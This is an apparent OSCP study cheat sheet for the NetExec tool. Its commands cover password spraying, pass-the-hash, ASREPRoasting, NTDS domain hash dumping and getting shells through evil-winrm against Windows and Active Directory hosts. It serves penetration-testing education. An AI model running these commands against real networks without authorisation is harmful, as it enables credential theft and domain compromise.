# NetExec (nxc) — Credential Validation & Lateral Movement (OSCP)

NetExec is the **modern successor to CrackMapExec**. The command is `nxc` (not `netexec`).
Use `nxc` over `crackmapexec` on any up-to-date Kali install.

Syntax is nearly identical to CME — just swap `crackmapexec` for `nxc`.

---

## When to Use NetExec

Use nxc **after you have credentials or hashes** to:
- Confirm creds are valid before going further
- Check if creds give admin access
- Spray one password across many users
- Enumerate users and shares
- Pass-the-hash without cracking

---

## Install Check

```bash
nxc --version
```

If not installed:
```bash
sudo apt install netexec -y
```

---

## Core Syntax

```bash
nxc <protocol> <target> [options]
```

Protocols:
- `smb` — Windows file sharing (port 445)
- `winrm` — Windows remote management (port 5985/5986)
- `rdp` — Remote desktop (port 3389)
- `ssh` — Secure shell (port 22)
- `ftp` — File transfer (port 21)
- `ldap` — Active Directory (port 389)

---

## Validate Credentials (Always Do This First)

```bash
nxc smb <IP> -u username -p password
```

Output to look for:
- `[+]` = valid credentials
- `(Pwn3d!)` = you have **local admin** on that machine

Example:
```bash
nxc smb 10.10.10.5 -u administrator -p Password1
```

---

## Password Spraying

Try one password against many users (avoids lockout):
```bash
nxc smb <IP> -u users.txt -p 'Password1'
```

To keep going after first hit (check all users):
```bash
nxc smb <IP> -u users.txt -p 'Password1' --continue-on-success
```

Spray against multiple passwords:
```bash
nxc smb <IP> -u users.txt -p passwords.txt --no-bruteforce
```

`--no-bruteforce` = tries user1:pass1, user2:pass2 (pairs) — NOT every combo.
Without it, it tries every user against every password (full brute force).

---

## Pass-the-Hash (No Cracking Needed)

```bash
nxc smb <IP> -u username -H <NTLM_HASH>
```

Example:
```bash
nxc smb 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Format is `LM:NT` — if you only have the NT hash, use:
```bash
nxc smb 10.10.10.5 -u administrator -H :31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Enumerate Shares

```bash
nxc smb <IP> -u username -p password --shares
```

---

## Enumerate Users

```bash
nxc smb <IP> -u username -p password --users
```

---

## Run a Command (If Admin)

```bash
nxc smb <IP> -u username -p password -x "whoami"
```

PowerShell:
```bash
nxc smb <IP> -u username -p password -X "whoami"
```

---

## WinRM Access

```bash
nxc winrm <IP> -u username -p password
```

If you see `(Pwn3d!)` → use `evil-winrm` for a full shell.

---

## RDP Access Check

```bash
nxc rdp <IP> -u username -p password
```

---

## Spray Across a Subnet

```bash
nxc smb 10.10.10.0/24 -u username -p password
```

Useful after pivoting into an internal network — test creds against everything.

---

## What Output Means

| Output | Meaning |
|--------|---------|
| `[+]` | Valid credentials |
| `(Pwn3d!)` | Local admin — can run commands |
| `[-]` | Invalid credentials |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked — stop spraying |

---

## LDAP — Active Directory Enumeration

```bash
nxc ldap <DC_IP> -u <user> -p <pass> --users
nxc ldap <DC_IP> -u <user> -p <pass> --groups
nxc ldap <DC_IP> -u <user> -p <pass> --pass-pol
nxc ldap <DC_IP> -u <user> -p <pass> --admin-count
```

---

## ASREPRoasting via LDAP

### Find Vulnerable Accounts (no password needed)

Test a username list — Kerberos will confirm which accounts exist and which are ASREPRoastable:

```bash
nxc ldap <DC_IP> -u users.txt -p "" -k
```

- `KDC_ERR_C_PRINCIPAL_UNKNOWN` → username does not exist
- `[+] account vulnerable to asreproast attack` → pre-auth disabled, hash extractable

> Requires domain name in `/etc/hosts` before running.

### Extract the AS-REP Hash

```bash
nxc ldap <DC_IP> -u <username> -p "" --asreproast output.txt
```

Hash format: `$krb5asrep$23$...` → crack with Hashcat `-m 18200`.

---

## NTDS Dump (Domain Hash Extraction)

Requires credentials for an account with DCSync rights:

```bash
nxc smb <DC_IP> -u <user> -p '<password>' --ntds
```

> Use single quotes when password contains `!` — double quotes cause bash to misparse it.

Output format: `user:RID:LM_hash:NT_hash:::`
The NT hash (4th field) is what you use for Pass-the-Hash.

---

## Pass-the-Hash — Bulk Testing After NTDS Dump

After dumping NTDS you have multiple users and hashes. The efficient path is to split them into two line-matched files and spray them against whatever service was open on nmap (WinRM 5985, SMB 445, RDP 3389).

### Step 1 — Split Into Separate Files

NTDS output format: `domain\user:RID:LM_hash:NT_hash:::`

```bash
# Usernames only — strips domain prefix, leaving plain username
awk -F: '{gsub(/.*\\/, "", $1); print $1}' dump.ntds > users.txt

# NT hashes only — field 4
cut -d':' -f4 dump.ntds > hashes.txt
```

Both files are line-matched: line 1 of `users.txt` pairs with line 1 of `hashes.txt`.

### Step 2 — Spray With --no-bruteforce

`--no-bruteforce` pairs by line number (user1:hash1, user2:hash2).
Without it, nxc tries every user against every hash — pointless here.

```bash
# WinRM
nxc winrm <IP> -u users.txt -H hashes.txt --no-bruteforce

# SMB (if WinRM not open)
nxc smb <IP> -u users.txt -H hashes.txt --no-bruteforce

# RDP
nxc rdp <IP> -u users.txt -H hashes.txt --no-bruteforce
```

Look for `[+]` (valid auth) and `(Pwn3d!)` (shell access).

### Step 3 — Drop Into Shell With evil-winrm

Once nxc identifies which account hits, take that specific user and hash to evil-winrm:

```bash
evil-winrm -u <user> -H <NT_hash> -i <IP>
```

> evil-winrm is your interactive shell — nxc is the sprayer that tells you which account to use.
> `-H` takes the NT hash only. Do not pass the LM hash (`aad3b435b51404eeaad3b435b51404ee`) — it always fails.

---

## Related Notes

- [[Active_Directory_Attacks]]
- [[AD_Username_Generation]]
- [[Password_Spraying]]
- [[Impacket]]
- [[Hashcat]]
- [[RDP_and_WinRM]]
- [[SMB]]
